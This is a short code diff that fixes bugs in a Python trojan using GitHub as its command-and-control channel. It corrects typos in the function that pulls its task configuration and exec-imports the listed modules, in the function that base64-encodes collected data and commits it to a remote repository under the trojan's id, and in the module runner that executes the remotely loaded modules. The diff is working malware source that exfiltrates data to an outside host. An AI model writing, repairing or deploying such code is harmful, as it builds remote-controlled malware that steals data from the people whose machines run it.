@@ -47,12 +47,12 @@ def get_trojan_config():
 	configured  = True
 
 	for task in config:
-		if task['modules'] not in sys.modules:
-			exec('import %s' % task['modules'])
+		if task['module'] not in sys.modules:
+			exec('import %s' % task['module'])
 
 	return config
 
-def store_modules_result(date):
+def store_modules_result(data):
 	gh, repo, branch = connect_to_github()
 	remote_path = 'data/%s/%d.data*' % (trojan_id, random.randint(1000, 10000))
 	repo.create_file(remote_path, 'commit message', base64.b64encode(data))
@@ -83,7 +83,7 @@ class GitImporter(object):
 
 
 def module_runner(module):
-	task_queue.put[1]
+	task_queue.put(1)
 	result = sys.modules[module].run()
 	task_queue.get()
 
